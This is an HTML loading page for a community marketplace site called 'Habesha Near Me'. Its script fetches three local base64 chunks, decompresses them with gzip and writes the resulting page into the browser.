<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <meta name="theme-color" content="#7b1e2b" />
  <title>Habesha Near Me</title>
  <style>
    *{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;background:linear-gradient(145deg,#3f0e17,#7b1e2b);color:#fffaf0;font-family:system-ui,-apple-system,"Segoe UI",sans-serif}.box{text-align:center;padding:30px}.mark{width:64px;height:64px;margin:0 auto 18px;border:3px solid #d8a72e;border-radius:20px;display:grid;place-items:center;font-weight:900;font-size:30px}.spinner{width:30px;height:30px;border:3px solid #ffffff40;border-top-color:#d8a72e;border-radius:50%;margin:22px auto;animation:spin .8s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}p{color:#ffffffb8}
  </style>
</head>
<body>
  <main class="box"><div class="mark">H</div><h1>Habesha Near Me</h1><div class="spinner"></div><p id="status">Loading the community marketplace…</p></main>
  <script>
  (async()=>{
    try{
      const files=['payload-00.txt','payload-01.txt','payload-02.txt'];
      const parts=await Promise.all(files.map(async file=>{
        const response=await fetch(file,{cache:'no-store'});
        if(!response.ok) throw new Error('Could not load '+file);
        return response.text();
      }));
      const binary=atob(parts.join('').replace(/\s/g,''));
      const bytes=Uint8Array.from(binary,char=>char.charCodeAt(0));
      if(typeof DecompressionStream==='undefined') throw new Error('Please open this site in an updated Chrome, Safari, Firefox or Edge browser.');
      const stream=new Blob([bytes]).stream().pipeThrough(new DecompressionStream('gzip'));
      const html=await new Response(stream).text();
      document.open();document.write(html);document.close();
    }catch(error){
      document.getElementById('status').textContent=error.message||'The site could not load. Please refresh.';
    }
  })();
  </script>
</body>
</html>
